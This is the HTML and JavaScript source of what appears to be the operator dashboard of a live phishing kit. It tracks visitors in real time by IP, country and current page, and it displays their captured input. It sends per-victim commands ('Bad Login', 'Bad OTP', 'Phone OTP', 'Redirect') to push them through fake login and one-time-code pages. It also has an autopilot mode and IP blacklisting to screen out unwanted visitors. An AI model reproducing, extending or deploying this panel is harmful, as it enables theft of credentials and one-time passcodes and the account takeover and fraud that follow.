<!DOCTYPE html>
<html>
<head>
  <title>Admin Dashboard</title>
  <style>
    body { font-family: sans-serif; background: #f7f7f7; padding: 20px; }
    h2 { color: #333; }
    table { border-collapse: collapse; width: 100%; background: #fff; border-radius: 8px; overflow: hidden; box-shadow: 0 0 5px rgba(0,0,0,0.1); }
    th, td { border: 1px solid #eee; padding: 10px; text-align: left; }
    th { background-color: #f0f0f0; }
    select { padding: 5px; }
    button { padding: 5px 10px; background-color: #4CAF50; border: none; color: white; cursor: pointer; border-radius: 4px; }
    button:hover { background-color: #45a049; }

    /* Modal styles */
    #inputModal {
      display: none;
      position: fixed;
      top: 50%; left: 50%;
      transform: translate(-50%, -50%);
      background: #fff;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.3);
      z-index: 1000;
      max-width: 80%;
      max-height: 70%;
      overflow: auto;
    }
    #inputModal pre { white-space: pre-wrap; word-wrap: break-word; }
    
    .toggle-btn {
  background: #ccc;
  border: none;
  border-radius: 20px;
  color: #fff;
  padding: 8px 16px;
  font-size: 14px;
  cursor: pointer;
  transition: background 0.3s;
}
.toggle-btn.on {
  background: #4CAF50;
}
.toggle-btn.off {
  background: #888;
}

.dot {
  display:inline-block;
  width:10px;
  height:10px;
  border-radius:50%;
  background:#00c200;
}
.blink {
  animation: blink 0.5s steps(1) 5;
}
@keyframes blink {
  50% { opacity:0; }
}

 #clearBlacklistBtn {
        width: 100%;
        max-width: 200px;
      }
  </style>
  
</head>
<body>
	<div id="header-placeholder"></div>

<script>
  fetch("/header")
  .then(res => res.text())
  .then(html => {
    document.getElementById("header-placeholder").innerHTML = html;

    // Attach event listener manually
    const btn = document.getElementById("clearBlacklistBtn");
    if (btn) {
      btn.addEventListener("click", async () => {
        if (!confirm("Are you sure you want to clear the blacklist?")) return;

        const res = await fetch("/admin/blacklist", { method: "DELETE" });
        if (res.ok) {
          alert("‚úÖ Blacklist cleared successfully!");
          location.reload();
        } else {
          alert("‚ùå Failed to clear blacklist.");
        }
      });
    }
  });
</script>  
	<div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:15px;">
  <h2>Dashboard</h2><div>
  <button id="autopilotBtn" class="toggle-btn"> Autopilot: </button>
  <button class="toggle-btn on" id="toggleViewBtn"> All Users</button>
  
  </div>
</div>

  <h2 id="list-header">Active Users</h2>
  <table id="userTable">
    <thead>
      <tr>
        <th>User ID</th>
        <th>Status</th>
        <th>IP</th>
        <th>Country</th>
        <th>Last Seen</th>
        <th>Page</th>
        <th>&nbsp;&nbsp;&nbsp;</th>
        <th>Action</th>
        <th>Res</th>
      </tr>
    </thead>
    <tbody></tbody>
  </table>

  <!-- Modal to display user input -->
  <div id="inputModal">
    <h5>Details</h5>
    <pre id="modalContent"></pre>
    <button onclick="closeModal()">Close</button>
  </div>
<script src="https://cdnjs.cloudflare.com/ajax/libs/howler/2.2.3/howler.min.js"></script>
  
</script>
  <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
  <script>
  const socket = io("/");
  let countryData = [];
  let users = [];
  let viewMode = "active";
  
  const sound = new Howl({
    src: ['notif.mp3', 'notif.ogg']
  });


  // ‚úÖ Load local country JSON
  fetch("/script/index.json")
    .then(res => res.json())
    .then(data => {
      countryData = data;
      console.log("‚úÖ Country data loaded:", countryData.length);
    })
    .catch(err => console.error("‚ùå Failed to load index.json:", err));

  // ‚úÖ Socket connection
  socket.on("connect", () => {
    console.log("üü¢ Connected to server as admin");
    socket.emit("admin:ready", { mode: viewMode });
  });

  // ‚úÖ Fetch viewMode from DB on load
  fetch("/admin/viewmode")
    .then(res => res.json())
    .then(data => {
      viewMode = data.viewMode || "active";
      console.log("viewMode:", viewMode);

      document.getElementById("toggleViewBtn").textContent =
        viewMode === "active" ? "All Users" : "Active Users";
      document.querySelector("#list-header").textContent =
        viewMode === "active" ? "Active Users" : "All Users";

      // Trigger initial socket emission
      socket.emit("admin:ready", { mode: viewMode });
    });

  // ‚úÖ Handle user blacklisting event
  socket.on("admin:blacklistAdded", ({ ip, status, userId }) => {
    console.log("Blacklisted:", ip, status, userId);

    const td = document.getElementById(`status-${userId}`);
    if (!td) return;

    if (status === "blocked") {
      td.innerHTML = `
        <button class="unblock-btn" id="unblock-btn-${userId}"
          data-id="${userId}" onclick="toggleBlockStatus('${userId}', 'all', '${status}')"
          style="background:red;color:white;border:none;padding:4px 8px;border-radius:4px;cursor:pointer;">
          Unblock
        </button>`;
    } else {
      td.textContent = status;
    }
  });

  // ‚úÖ Normalize country code
  function normalizeCode(str) {
    if (!str) return "";
    return str.trim().toUpperCase().replace(/[^A-Z]/g, "").slice(0, 2);
  }

  // ‚úÖ Receive admin user updates
  socket.on("admin:update", (userList) => {
    users = userList;
    const tbody = document.querySelector("#userTable tbody");
    tbody.innerHTML = "";
    
    sound.play();

    console.log(viewMode, users);

    userList.forEach(u => {
      const code = normalizeCode(u.country);
      const country = countryData.find(c => c.code === code);
      const flag = country
        ? `<img src="${country.image}" alt="${country.code}" width="20" title="${country.name}" />`
        : "‚ùì";

      const cleanPage = (u.page || "").replace(/\//g, "").toLowerCase();

      let incorrectOption = "";
      if (cleanPage === "login") incorrectOption = `<option value="bad-login">Bad Login</option>`;
      else if (cleanPage === "otp") incorrectOption = `<option value="bad-otp">Bad OTP</option>`;

      const row = document.createElement("tr");

      // ‚úÖ All Users mode
      if (viewMode === "all") {
        const isBlocked = u.status === "blocked";
        const blockBtnLabel = isBlocked ? "Unblock" : "Block";
        const blockBtnColor = isBlocked ? "red" : "#222";

        row.innerHTML = `
          <td>${u.identifier || u.id}</td>
          <td id="status-${u.id}" style="color:${isBlocked ? 'red' : 'inherit'};font-weight:${isBlocked ? 'bold' : 'normal'};">
            ${u.status}
          </td>
          <td>${u.ip || "‚Äî"}</td>
          <td>${flag}</td>
          <td>${u.last_seen || "‚Äî"}</td>
          <td id="userpage-${u.id}">${u.screen || u.page || "‚Äî"}</td>
          <td id="misc-${u.id}"></td>
          <td style="text-align:center;">
            <button class="delete-btn" data-id="${u.id}" id="deletebtn-${u.id}" onclick="deleteUser('${u.id}')"
              style="background:#d33;color:white;border:none;padding:4px 8px;border-radius:4px;cursor:pointer;">
              Delete
            </button> 
            <div style="margin-top:5px;">
              <button class="block-toggle-btn"
                data-id="${u.id}" id="blockbtn-${u.id}"
                data-status="${u.status}" onclick="toggleBlockStatus('${u.id}', 'all', '${u.status}')"
                style="background:${blockBtnColor};color:white;border:none;padding:4px 8px;border-radius:4px;cursor:pointer;">
                ${blockBtnLabel}
              </button>
            </div>
          </td>
          <td><button onclick="viewInput('${u.id}')">üëÅÔ∏è</button></td>
        `;
      }

      // ‚úÖ Active Users mode
      else {
        row.innerHTML = `
          <td>${u.identifier || u.id}</td>
          <td id="status-${u.id}">
            ${u.status === "blocked"
              ? `<button class="unblock-btn" id="unblock-btn-${u.id}"
                  data-id="${u.id}" onclick="toggleBlockStatus('${u.id}', 'active', '${u.status}')"
                  style="background:red;color:white;border:none;padding:4px 8px;border-radius:4px;cursor:pointer;">
                  Unblock
                </button>`
              : u.status}
          </td>
          <td>${u.ip || "‚Äî"}</td>
          <td>${flag}</td>
          <td>${u.last_seen || "‚Äî"}</td>
          <td id="userpage-${u.id}">${u.screen || u.page || "‚Äî"}</td>
          <td>
            <input id="ph-otp-${u.id}" type="text" inputmode="numeric"
              maxlength="4" pattern="[0-9]*"
              oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0,4)"
              style="display:none; max-width:45px;" placeholder="xxxx">
            <span id="dot-${u.id}" class="dot" style="display:none;"></span>
          </td>
          <td>
            <select id="cmd-${u.id}" onchange="toggleOtpInput('${u.id}')">
              <option value="">Command</option>
              ${incorrectOption}
              <option value="refresh">Refresh</option>
              <option value="nextpage">Next</option>
              <option value="redirect">Redirect</option>
              <option value="phone-otp">Phone OTP</option>
            </select>
            <button onclick="sendCommand('${u.id}')">Send</button>
          </td>
          <td><button onclick="viewInput('${u.id}')">üëÅÔ∏è</button></td>
        `;
      }

      tbody.appendChild(row);
    });
  });

  // ‚úÖ Toggle OTP visibility
  function toggleOtpInput(userId) {
    const select = document.getElementById(`cmd-${userId}`);
    const otpInput = document.getElementById(`ph-otp-${userId}`);
    otpInput.style.display = select.value === "phone-otp" ? "inline-block" : "none";
  }

  // ‚úÖ Send admin command
  function sendCommand(userId) {
    const select = document.getElementById(`cmd-${userId}`);
    const command = select.value;
    if (!command) return alert("Please select a command first");

    const otpInput = document.getElementById(`ph-otp-${userId}`);
    const otpValue = otpInput?.value?.trim();

    const payload = { userId, command };
    if (command === "phone-otp" && otpValue) payload.otp = otpValue;

    socket.emit("admin:command", payload);
    console.log(`üì§ Sent command '${command}' to user ${userId}`, payload);
    alert(`Command '${command}' sent to user ${userId}`);

    select.value = "";
    otpInput.style.display = "none";
    otpInput.value = "";
  }

  // ‚úÖ Modal view for user input
  function viewInput(userId) {
    const user = users.find(u => u.id === userId);
    const content = user?.input_data || "No input yet";
    document.getElementById("modalContent").textContent = content;
    document.getElementById("inputModal").style.display = "block";
  }

  function closeModal() {
    document.getElementById("inputModal").style.display = "none";
  }

  // ‚úÖ Toggle between Active & All users
  const toggleBtn = document.getElementById("toggleViewBtn");

  toggleBtn.addEventListener("click", async () => {
  // Disable button immediately (prevent double clicks)
  console.log("view button toggled");
  toggleBtn.disabled = true;
  toggleBtn.style.backgroundColor = "#cccccc"; // grey

  // Toggle view mode
  viewMode = viewMode === "active" ? "all" : "active";

  try {
    // Save new mode in DB
    await fetch("/admin/viewmode", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ viewMode }),
    });

    // Update UI text while waiting
    toggleBtn.textContent = viewMode === "active" ? "All Users" : "Active Users";
    document.querySelector("#list-header").textContent =
      viewMode === "active" ? "Active Users" : "All Users";

    // Listen for server response exactly ONCE
    socket.once("admin:update", () => {
      // Re-enable button
      toggleBtn.disabled = false;

      // Set correct background color after update
      toggleBtn.style.backgroundColor =
        viewMode === "active" ? "#006400" : "#32CD32";
        
        console.log("view button color: ", mode);

    });

    // Ask server for fresh list
    socket.emit("admin:ready", { mode: viewMode });

  } catch (err) {
    console.error("Toggle error:", err);
    // Re-enable button even if failed
    toggleBtn.disabled = false;
    toggleBtn.style.backgroundColor =
      viewMode === "all" ? "#006400" : "#32CD32";
  }
});
</script>
<script>
const autopilotBtn = document.getElementById("autopilotBtn");

async function getAutopilotState() {
  const res = await fetch("/autopilot");
  const data = await res.json();
  setAutopilotUI(data.autopilot === 1);
}

async function toggleBlockStatus(userId, mode = "all", userStatus = "") {
  // Find the clicked button using its unique ID
  const button =
    document.querySelector(`#blockbtn-${userId}`) ||
    document.querySelector(`#unblock-btn-${userId}`);

  if (!button) {
    console.error("Button not found for user:", userId);
    return;
  }

  console.log(`Button found for user: ${userId}, Mode: ${mode}`);

  // Determine current state
  const currentLabel = button.textContent.trim().toLowerCase();
  const currentlyShowsBlock = currentLabel === "block";

  // Select route, label, and color
  const route = currentlyShowsBlock ? "/block" : "/unblock";
  const newLabel = currentlyShowsBlock ? "Unblock" : "Block";
  const newColor = currentlyShowsBlock ? "red" : "#222";

  console.log(`${currentlyShowsBlock ? "Blocking" : "Unblocking"} user:`, userId);

  try {
    const res = await fetch(route, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ userId }),
    });

    console.log("Server response:", res.status);

    if (res.ok) {
      if (mode === "all") {
        // ‚úÖ "All Users" mode ‚Üí update button as before
        button.textContent = newLabel;
        button.style.backgroundColor = newColor;

        const statusEl = document.querySelector(`#status-${userId}`);
        if (statusEl) {
		  statusEl.innerHTML = currentlyShowsBlock ? "blocked" : "offline";
		
		  if (route === "/unblock") {
		    // When unblocking
		    statusEl.style.color = "black";
		    statusEl.style.fontWeight = "normal";
		  } else {
		    // When blocking
		    statusEl.style.color = "red";
		    statusEl.style.fontWeight = "bold";
		  }
		} 

        console.log(`‚úÖ User ${userId} is now ${newLabel.toLowerCase()}`);
      } else if (mode === "active") {
        // ‚úÖ "Active Users" mode ‚Üí update text and color accordingly
        const td = document.getElementById(`status-${userId}`);
        if (td) {
          td.textContent = userStatus || (currentlyShowsBlock ? "blocked" : "active");
          td.style.color = route === "/unblock" ? "red" : "black";
        }
        console.log(`‚úÖ Updated status cell for ${userId} to ${userStatus}`);
      }
    } else {
      console.error(`‚ùå Failed to ${currentlyShowsBlock ? "block" : "unblock"} user`);
    }
  } catch (err) {
    console.error("‚ö†Ô∏è Error during block/unblock:", err);
  }
}

async function deleteUser(userId) {
  if (!confirm("Are you sure you want to delete this user?")) return;

  try {
    const res = await fetch("/deleteuser", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ userId }),
    });

    if (res.ok) {
      console.log(`‚úÖ User ${userId} deleted successfully.`);
      alert("User deleted successfully!");

      // Optionally remove the row from the table
      const row = document.querySelector(`#deletebtn-${userId}`)?.closest("tr");
      if (row) row.remove();
    } else {
      console.error(`‚ùå Failed to delete user ${userId}`);
      alert("Failed to delete user. Please try again.");
    }
  } catch (err) {
    console.error("‚ö†Ô∏è Error deleting user:", err);
    alert("An error occurred while deleting the user.");
  }
}

function setAutopilotUI(isOn) {
  if (isOn) {
    autopilotBtn.classList.add("on");
    autopilotBtn.classList.remove("off");
    autopilotBtn.textContent = "üü¢ Autopilot: ON";
  } else {
    autopilotBtn.classList.add("off");
    autopilotBtn.classList.remove("on");
    autopilotBtn.textContent = "‚ö´ Autopilot: OFF";
  }
}

autopilotBtn.addEventListener("click", async () => {
  const isCurrentlyOn = autopilotBtn.classList.contains("on");
  const newState = isCurrentlyOn ? 0 : 1;
  const res = await fetch("/autopilot", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ autopilot: newState })
  });
  const data = await res.json();
  setAutopilotUI(data.autopilot === 1);
});

getAutopilotState();

function toggleOtpInput(id) {
  const cmd = document.getElementById(`cmd-${id}`).value;
  const otpInput = document.getElementById(`ph-otp-${id}`);
  const dot = document.getElementById(`dot-${id}`);

  if (cmd === "phone-otp") {
    otpInput.style.display = "inline-block";
    dot.style.display = "none";
  } else {
    otpInput.style.display = "none";
    dot.style.display = "none"; // hidden by default until triggered
  }
}


function triggerBlink(id) {
  const dot = document.getElementById(`dot-${id}`);
  if (!dot) return;
  
  dot.classList.remove("blink"); 
  void dot.offsetWidth;
  
  dot.style.display = "inline-block";
  dot.classList.add("blink");

  setTimeout(() => {
    dot.classList.remove("blink");
    dot.style.display = "none";
  }, 5000); 
}
</script> 

</body>
</html> 